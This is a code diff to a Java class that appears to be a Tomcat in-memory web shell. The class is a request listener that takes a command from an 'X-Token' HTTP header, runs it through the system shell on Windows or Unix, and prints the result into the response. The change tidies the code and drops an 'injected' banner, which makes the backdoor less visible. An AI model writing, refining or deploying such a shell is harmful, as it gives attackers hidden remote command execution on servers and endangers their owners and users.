@@ -14,6 +14,7 @@ import java.lang.reflect.Method;
  * Tomcat 8 9
  */
 public class TomcatListenerContextClassMS implements ServletRequestListener {
+    private static String header = "X-Token";
     public TomcatListenerContextClassMS() {
 
     }
@@ -52,14 +53,13 @@ public class TomcatListenerContextClassMS implements ServletRequestListener {
     public void requestInitialized(ServletRequestEvent servletRequestEvent) {
         try {
             HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequestEvent.getServletRequest();
-            String header = httpServletRequest.getHeader("X-Token");
-            if (header == null) {
+            String cmd = httpServletRequest.getHeader(header);
+            if (cmd == null) {
                 return;
             }
-            String result = exec(header);
+            String result = exec(cmd);
             org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) getFieldValue(httpServletRequest, "request");
             PrintWriter printWriter = request.getResponse().getWriter();
-            printWriter.println("TomcatListenerContextClassMS injected");
             printWriter.println(result);
         } catch (Exception e) {
 
@@ -71,7 +71,7 @@ public class TomcatListenerContextClassMS implements ServletRequestListener {
     public static String exec(String str) {
         try {
             String[] cmd = null;
-            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
+            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                 cmd = new String[]{"cmd.exe", "/c", str};
             } else {
                 cmd = new String[]{"/bin/sh", "-c", str};
